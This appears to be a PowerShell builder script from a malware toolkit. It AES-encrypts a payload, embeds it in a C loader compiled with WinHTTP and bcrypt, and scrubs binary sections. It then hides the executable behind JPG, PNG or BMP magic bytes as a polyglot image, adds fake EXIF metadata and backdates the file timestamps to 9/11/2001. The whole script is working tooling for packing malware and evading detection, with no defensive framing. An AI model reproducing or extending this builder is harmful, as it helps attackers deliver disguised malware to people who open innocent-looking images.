param (
    [string]$Output,
    [string]$Payload,
    [string]$BaseKey,
    [string]$Salt,
    [string]$IV,
    [switch]$NoPolyglot,
    [switch]$NoExif,
    [string]$Format = "jpg",
    [switch]$Help
)

function Show-Usage {
    Write-Host "Usage: .\quantum_forge_win.ps1 -Output <file> -Payload <file> -BaseKey <key> -Salt <salt> -IV <iv> [OPTIONS]"
    Write-Host ""
    Write-Host "Options:"
    Write-Host "  -NoPolyglot     Build binary only, skip polyglot creation"
    Write-Host "  -NoExif         Skip EXIF metadata embedding"
    Write-Host "  -Format <fmt>   Image format: jpg, png, bmp (default: jpg)"
    Write-Host "  -Help           Show this help message"
    exit 0
}

if ($Help) {
    Show-Usage
}

if (-not $Output -or -not $Payload -or -not $BaseKey -or -not $Salt -or -not $IV) {
    Write-Error "Missing required parameters"
    Show-Usage
}

if ($Format -notin @("jpg", "png", "bmp")) {
    Write-Error "Invalid format. Use jpg, png, or bmp"
    exit 1
}

$Template = "quantum_loader_win.c"
$WorkingC = "quantum_temp.c"
$OutputExe = "quantum_loader_win.exe"

# Generate junk.h
Write-Host "[*] Generating polymorphic junk.h..."
python generate_junk.py

# Encrypt payload
Write-Host "[*] Encrypting payload..."
$derived_key = & openssl hkdf -binary -md sha256 -keylen 32 -salt $Salt -inkey $BaseKey
& openssl enc -aes-256-cbc -in $Payload -out encrypted.bin -K $derived_key -iv $IV -nopad

# Convert to C byte arrays
$encPayloadHex = (Get-Content encrypted.bin -Encoding Byte | ForEach-Object { '\x{0:X2}' -f $_ }) -join ''
$saltHex = ($Salt | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''
$ivHex = ($IV | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''
$baseKeyHex = ($BaseKey | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''

# Generate C code
Write-Host "[*] Embedding encrypted payload..."
(Get-Content $Template) `
    -replace '__ENCRYPTED_PAYLOAD__', $encPayloadHex `
    -replace '__FIXED_SALT__', $saltHex `
    -replace '__IV__', $ivHex `
    -replace '__BASE_KEY__', $baseKeyHex `
    | Set-Content $WorkingC

# Compile
Write-Host "[*] Compiling..."
if (Get-Command cl.exe -ErrorAction SilentlyContinue) {
    cl.exe /nologo /Os /MT /Fe:$OutputExe $WorkingC bcrypt.lib winhttp.lib > $null
} else {
    Write-Error "❌ cl.exe not found."
    exit 1
}

# Strip and scrub sections
Write-Host "[*] Scrubbing binary sections..."
python scrub_sections.py $OutputExe 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Section scrubbing skipped (lief not installed)"
}

if (-not $NoPolyglot) {
    Write-Host "[*] Creating polyglot image ($Format)..."
    
    $ExeBytes = [System.IO.File]::ReadAllBytes($OutputExe)
    
    switch ($Format) {
        "jpg" {
            $Header = [byte[]]@(0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00)
            [System.IO.File]::WriteAllBytes($Output, $Header + $ExeBytes)
        }
        "png" {
            $Header = [byte[]]@(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
            [System.IO.File]::WriteAllBytes($Output, $Header + $ExeBytes)
        }
        "bmp" {
            $Size = $ExeBytes.Length
            $Total = 54 + $Size
            $Header = [byte[]]@(0x42, 0x4D)
            $Header += [byte[]]@($Total -band 0xFF, ($Total -shr 8) -band 0xFF, ($Total -shr 16) -band 0xFF, ($Total -shr 24) -band 0xFF)
            $Header += [byte[]]@(0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00)
            $Header += [byte[]]@(0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00)
            [System.IO.File]::WriteAllBytes($Output, $Header + $ExeBytes)
        }
    }
    
    if (-not $NoExif -and (Get-Command exiftool -ErrorAction SilentlyContinue)) {
        Write-Host "[*] Embedding EXIF metadata..."
        exiftool -overwrite_original -Model="QuantumLoader" -Artist="InvisibleThread" -Comment="Secure Payload" $Output 2>$null
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[!] EXIF embedding failed"
        }
    }
    
    (Get-Item $Output).LastWriteTime = Get-Date "09/11/2001 06:06:06"
    (Get-Item $Output).CreationTime = Get-Date "09/11/2001 06:06:06"
    
    Write-Host "[*] Validating polyglot integrity..."
    $FileHeader = [System.IO.File]::ReadAllBytes($Output) | Select-Object -First 8
    
    switch ($Format) {
        "jpg" {
            if ($FileHeader[0] -eq 0xFF -and $FileHeader[1] -eq 0xD8) {
                Write-Host "[+] JPEG magic bytes verified"
            } else {
                Write-Host "[!] Warning: JPEG magic bytes invalid"
            }
        }
        "png" {
            if ($FileHeader[0] -eq 0x89 -and $FileHeader[1] -eq 0x50 -and $FileHeader[2] -eq 0x4E -and $FileHeader[3] -eq 0x47) {
                Write-Host "[+] PNG magic bytes verified"
            } else {
                Write-Host "[!] Warning: PNG magic bytes invalid"
            }
        }
        "bmp" {
            if ($FileHeader[0] -eq 0x42 -and $FileHeader[1] -eq 0x4D) {
                Write-Host "[+] BMP magic bytes verified"
            } else {
                Write-Host "[!] Warning: BMP magic bytes invalid"
            }
        }
    }
    
    Write-Host "[+] Polyglot complete: $Output"
} else {
    Copy-Item $OutputExe $Output
    Write-Host "[+] Binary complete: $Output"
}

Remove-Item $WorkingC, encrypted.bin, junk.h, $OutputExe -ErrorAction SilentlyContinue
